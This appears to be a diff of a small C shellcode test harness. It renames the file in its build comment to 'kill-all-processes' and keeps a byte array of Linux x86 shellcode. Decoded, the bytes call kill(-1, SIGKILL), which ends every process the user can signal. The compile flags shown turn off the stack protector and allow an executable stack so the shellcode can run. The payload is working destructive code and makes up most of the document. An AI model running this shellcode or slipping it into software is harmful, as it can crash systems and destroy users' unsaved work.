@@ -6,7 +6,7 @@
 #include<stdio.h>
 #include<string.h>
 
-//compile with: gcc shellcode-one.c -o shellcode-one -fno-stack-protector -z execstack
+//compile with: gcc kill-all-processes.c -o kill-all-processes -fno-stack-protector -z execstack
 
 unsigned char code[] = \
 "\x31\xc0\x89\xc3\xb0\x63\x2c\x3e\xb3\x01\xf7\xdb\xb1\x09\xcd\x80";
